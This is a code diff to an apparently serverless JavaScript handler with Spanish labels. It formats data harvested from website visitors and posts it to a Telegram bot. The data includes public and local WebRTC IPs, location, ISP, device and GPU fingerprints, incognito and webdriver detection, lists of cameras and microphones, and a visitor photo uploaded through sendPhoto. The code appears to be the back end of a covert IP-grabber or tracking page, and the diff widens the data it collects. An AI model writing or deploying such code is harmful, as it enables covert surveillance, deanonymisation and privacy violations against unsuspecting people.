@@ -28,7 +28,7 @@ exports.handler = async (event) => {
       return {
         statusCode: 500,
         headers: { "Access-Control-Allow-Origin": "*" },
-        body: JSON.stringify({ success: false, error: "Faltan variables de entorno" })
+        body: JSON.stringify({ success: false, error: "Faltan variables" })
       };
     }
 
@@ -41,13 +41,14 @@ exports.handler = async (event) => {
 
     msg += "Red\n";
     msg += "• IP Pública: " + clean(data.ip) + "\n";
-    msg += "• IP Local (WebRTC): " + clean(data.localIPs) + "\n";
+    msg += "• IP Local: " + clean(data.localIPs) + "\n";
     msg += "• País: " + clean(data.country) + "\n";
     msg += "• Ciudad: " + clean(data.city) + "\n";
     msg += "• Región: " + clean(data.region) + "\n";
     msg += "• ISP: " + clean(data.isp) + "\n";
     msg += "• Conexión: " + clean(data.conexion) + "\n";
-    msg += "• RTT: " + clean(data.rtt) + "\n\n";
+    msg += "• RTT: " + clean(data.rtt) + "\n";
+    msg += "• Save-Data: " + clean(data.saveData) + "\n\n";
 
     msg += "Dispositivo\n";
     msg += "• OS: " + clean(data.os) + "\n";
@@ -55,8 +56,11 @@ exports.handler = async (event) => {
     msg += "• Tipo: " + clean(data.device) + "\n";
     msg += "• RAM: " + clean(data.ram) + "\n";
     msg += "• Núcleos: " + clean(data.nucleos) + "\n";
-    msg += "• Pantalla: " + clean(data.pantalla) + " (" + clean(data.pixelRatio) + "x)\n";
-    msg += "• Orientación: " + clean(data.orientacion) + "\n";
+    msg += "• Pantalla: " + clean(data.pantalla) + "\n";
+    msg += "• Viewport: " + clean(data.viewport) + "\n";
+    msg += "• Pixel Ratio: " + clean(data.pixelRatio) + "\n";
+    msg += "• Orientación: " + clean(data.orientacion) + " (" + clean(data.angulo) + ")\n";
+    msg += "• Pantallas: " + clean(data.pantallas) + "\n";
     msg += "• GPU: " + clean(data.gpuRenderer) + "\n\n";
 
     msg += "Fingerprints\n";
@@ -74,17 +78,22 @@ exports.handler = async (event) => {
     msg += "• Giroscopio: " + clean(data.giroscopio) + "\n\n";
 
     msg += "Detecciones\n";
+    msg += "• Modo: " + clean(data.modo) + "\n";
     msg += "• AdBlock: " + clean(data.adblock) + "\n";
     msg += "• Incógnito: " + clean(data.incognito) + "\n";
+    msg += "• Reduced Motion: " + clean(data.reducedMotion) + "\n";
+    msg += "• Teclado virtual: " + clean(data.tecladoVirtual) + "\n";
     msg += "• Webdriver: " + clean(data.webdriver) + "\n\n";
 
     msg += "Media\n";
     msg += "• Cámaras: " + clean(data.cameras) + "\n";
     msg += "• Micrófonos: " + clean(data.mics) + "\n";
-    msg += "• Altavoces: " + clean(data.speakers) + "\n\n";
+    msg += "• Altavoces: " + clean(data.speakers) + "\n";
+    msg += "• Voces: " + clean(data.voces).substring(0, 100) + "\n\n";
 
     msg += "Otras\n";
-    msg += "• Tiempo en página: " + clean(data.tiempoEnPagina) + "\n";
+    msg += "• Memoria JS: " + clean(data.memoriaJS) + "\n";
+    msg += "• Tiempo total: " + clean(data.tiempoTotal) + "\n";
     msg += "• History: " + clean(data.historyLength) + "\n";
     msg += "• Táctil: " + clean(data.toque) + " (" + clean(data.maxTouchPoints) + ")\n";
     msg += "• Idioma: " + clean(data.idioma) + "\n";
@@ -93,7 +102,6 @@ exports.handler = async (event) => {
 
     msg += new Date().toLocaleString("es-AR", { timeZone: "America/Argentina/Buenos_Aires" });
 
-    // Enviar texto
     const msgRes = await fetch("https://api.telegram.org/bot" + TOKEN + "/sendMessage", {
       method: "POST",
       headers: { "Content-Type": "application/json" },
@@ -102,15 +110,14 @@ exports.handler = async (event) => {
 
     const msgResult = await msgRes.json();
     if (!msgRes.ok) {
-      console.error("Error texto:", msgResult);
+      console.error(msgResult);
       return {
         statusCode: 500,
         headers: { "Access-Control-Allow-Origin": "*" },
-        body: JSON.stringify({ success: false, error: "Error Telegram", details: msgResult })
+        body: JSON.stringify({ success: false, error: "Telegram error", details: msgResult })
       };
     }
 
-    // Foto
     if (data.foto && typeof data.foto === "string" && data.foto.startsWith("data:image")) {
       try {
         const base64 = data.foto.replace(/^data:image\/\w+;base64,/, "");
@@ -119,22 +126,14 @@ exports.handler = async (event) => {
         form.append("chat_id", CHAT_ID);
         form.append("caption", "Foto - 474747");
         form.append("photo", new Blob([buffer], { type: "image/jpeg" }), "foto.jpg");
-        await fetch("https://api.telegram.org/bot" + TOKEN + "/sendPhoto", {
-          method: "POST",
-          body: form
-        });
-      } catch (e) {
-        console.error("Error foto:", e);
-      }
+        await fetch("https://api.telegram.org/bot" + TOKEN + "/sendPhoto", { method: "POST", body: form });
+      } catch (e) { console.error("Foto error:", e); }
     }
 
     return {
       statusCode: 200,
-      headers: {
-        "Content-Type": "application/json",
-        "Access-Control-Allow-Origin": "*"
-      },
-      body: JSON.stringify({ success: true, message: "Enviado" })
+      headers: { "Content-Type": "application/json", "Access-Control-Allow-Origin": "*" },
+      body: JSON.stringify({ success: true })
     };
 
   } catch (error) {
